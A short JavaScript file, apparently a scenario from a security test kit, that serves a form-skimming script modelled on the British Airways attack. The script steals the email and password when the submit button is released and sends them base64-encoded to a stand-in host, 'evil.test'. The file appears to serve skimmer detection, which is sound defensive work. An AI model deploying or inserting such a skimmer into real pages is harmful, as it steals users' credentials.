// A skimmer that reads the fields when the submit button is released (as on British Airways).
import { scenario } from './probe-kit.js';

export const respond = scenario((ctx) => `document.getElementById('go').addEventListener('mouseup', function () {
  new Image().src = '${ctx.origin('evil.test')}/p?d=' + btoa(document.getElementById('email').value + '|' + document.getElementById('password').value);
});`);
